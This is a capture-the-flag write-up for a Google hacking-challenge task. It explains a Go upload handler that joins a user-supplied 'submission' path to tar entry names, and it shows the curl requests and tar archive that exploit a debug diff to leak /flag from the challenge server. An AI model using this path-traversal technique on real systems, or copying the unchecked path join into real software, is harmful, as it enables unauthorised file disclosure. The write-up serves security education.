# Episode 4: Challenge 1

## Description

> This endpoint is used by the VRP website to download attachments. It also has a rarely-used endpoint for importing bulk attachments, probably used for backups or migrations. Maybe it contains some bugs?
> 
> Hint: Some of the pages on this version of the website are different, look around for hints about new endpoints. 

A link to a website was attached.

## Solution

The attached website is a duplicate of the "Google VRP" website, used to submit vulnerabilities to Google.

The FAQ contains the following Q&A:

```
Q: Why did my attachment fail to upload?

A: To debug, you should call the /import endpoint manually and look at the detailed error message in the response. The same applies to the /export endpoint for downloading attachments from a submission. 
```

Let's try it:

```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl "https://path-less-traversed-web.h4ck.ctfcompetition.com/import"
only POST allowed

┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import"
missing submission parameter

┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=0"
server undergoing migration, import endpoint is temporarily disabled (dry run still enabled)
```

Dry run? What? Well, this challenge becomes much more understandable once we get the source code from [Challenge 3](e04c03.md).

```go
// importAttachments imports a tar archive of attachments for a submission.
func importAttachments(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	submission := r.URL.Query().Get("submission")
	if submission == "" {
		http.Error(w, "missing submission parameter", http.StatusBadRequest)
		return
	}

	// Allow a dry run to test the endpoint.
	dryRun := r.URL.Query().Get("dryRun") != ""

	// TODO: Remove this before deploying to prod!
	debug := r.URL.Query().Get("debug") != ""

	// Read the archive from the request.
	r.ParseMultipartForm(32 << 20) // Limit max input length
	file, header, err := r.FormFile("attachments")
	if err != nil {
		http.Error(w, fmt.Sprintf("could not open file %v: %v", file, err), http.StatusBadRequest)
		return
	}
	defer file.Close()

	filename := filepath.Base(header.Filename)

	// Open with gzip and tar.
	in, err := gzip.NewReader(file)
	if err != nil {
		http.Error(w, fmt.Sprintf("could not open file %v with gzip: %v", filename, err), http.StatusBadRequest)
		return
	}
	tr := tar.NewReader(in)

	// Parse the .tar.gz file.
	for {
		var err error

		// Read until the EOF chunk.
		h, err := tr.Next()
		if err != nil {
			if err == io.EOF {
				break
			}
			http.Error(w, fmt.Sprintf("error reading tar entry: %v", err), http.StatusBadRequest)
			return
		}

		// Skip directories.
		if h.FileInfo().IsDir() {
			fmt.Printf("skipping directory %v in archive\n", h.Name)
			continue
		}

		// Check if the file already exists. If so, show a diff.
		attachmentPath := path.Join(submission, h.Name)
		info, err := os.Stat(attachmentPath)
		if err != nil {
			fmt.Fprintf(w, "new file: %v\n", attachmentPath)
			continue
		}

		// File already exists.
		if !info.Mode().IsRegular() {
			fmt.Fprintf(w, "skipping non-regular file attachment %v\n", attachmentPath)
			continue
		}
		fmt.Fprintf(w, "WARNING: file %v already exists and would get overwritten (enable debug to see differences)\n", attachmentPath)

		// Read the archive file.
		trContents, err := ioutil.ReadAll(tr)
		if err != nil {
			http.Error(w, fmt.Sprintf("error reading uploaded attachment %v: %v", h.Name, err), http.StatusBadRequest)
			return
		}

		// TODO: Remove this before deploying to prod!
		if debug {
			trString := string(trContents)

			existingContents, err := ioutil.ReadFile(attachmentPath)
			if err != nil {
				http.Error(w, fmt.Sprintf("error reading existing file %v: %v", attachmentPath, err), http.StatusBadRequest)
				return
			}
			existingString := string(existingContents)

			if strings.Compare(trString, existingString) == 0 {
				fmt.Fprintf(w, "no differences\n")
				continue
			}

			msg := "showing existing and new contents:\n"
			msg += "=====\n"
			for _, line := range strings.Split(strings.ReplaceAll(existingString, "\r\n", "\n"), "\n") {
				msg += fmt.Sprintf("< %s\n", line)
			}
			msg += "-----\n"
			for _, line := range strings.Split(strings.ReplaceAll(trString, "\r\n", "\n"), "\n") {
				msg += fmt.Sprintf("> %s\n", line)
			}
			msg += "=====\n"
			fmt.Fprintf(w, "%s\n", msg)

			// Debug mode, so just continue without writing the file.
			continue
		}

		// Write the new file.
		os.WriteFile(attachmentPath, trContents, 0660)
	}
}
```

Now we see that we can provide a `dryRun` parameter. Moreover, we can also provide a `debug` parameter which prints out much more details. 
And above all that, we can also spot a subtle vulnerability that allows us to perform a Local File Inclusion attack by controlling the `submission` parameter.

Let's use all that to leak the flag. We'll assume that the flag is located at `/flag` like in other challenges.

First, we need to create a dummy `flag` file, zipped in a GZIP archive:

```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ echo fake_flag > flag

┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ tar -zcvf test.tar.gz flag
flag
```

We submit it to the `import` endpoint:

```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=/&debug=1&dryRun=1" -F attachments=@test.tar.gz
WARNING: file /flag already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:
=====
< https://h4ck1ng.google/solve/TakingThePathLessTraversed
<
-----
> fake_flag
>
=====
```

The `/` from the `submission` parameter was joined with the `flag` that we archived and allowed us to see the diff between our dummy file and `/flag`, leaking us the real flag.
